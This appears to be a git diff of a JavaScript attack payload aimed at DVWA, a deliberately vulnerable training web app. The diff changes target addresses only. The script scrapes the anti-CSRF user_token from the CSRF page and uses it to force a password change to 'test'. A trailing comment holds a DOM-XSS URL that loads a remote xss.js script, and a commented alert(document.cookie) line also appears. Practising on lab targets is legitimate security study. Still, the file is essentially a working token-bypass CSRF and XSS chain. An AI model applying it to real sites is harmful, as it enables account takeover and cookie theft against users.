@@ -1,6 +1,6 @@
 // alert(document.cookie);
 
-var theUrl = 'http://140.118.121.110:22334/DVWA-master/vulnerabilities/csrf/';
+var theUrl = 'http://192.168.1.66/DVWA-master/vulnerabilities/csrf/';
 
 if(window.XMLHttpRequest) {
     xmlhttp = new XMLHttpRequest();
@@ -20,7 +20,7 @@ xmlhttp.onreadystatechange = function(){
         // console.log(match);
         // alert(match[1]);
         var token = match[1];
-        var new_url = 'http://140.118.121.110:22334/DVWA-master/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change&user_token=' + token + '#';
+        var new_url = 'http://192.168.1.66/DVWA-master/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change&user_token=' + token + '#';
         if(count == 0){
             count++;
             xmlhttp.open("GET", new_url, false);
@@ -32,5 +32,5 @@ xmlhttp.onreadystatechange = function(){
 xmlhttp.open("GET", theUrl, false);
 xmlhttp.send();
 
-// http://140.118.121.110:22334/DVWA-master/vulnerabilities/xss_d/?default=English#<script src="http://140.118.121.100/xss.js"></script>
+// http://192.168.1.66/DVWA-master/vulnerabilities/xss_d/?default=English#<script src="http://192.168.1.66/xss.js"></script>
 
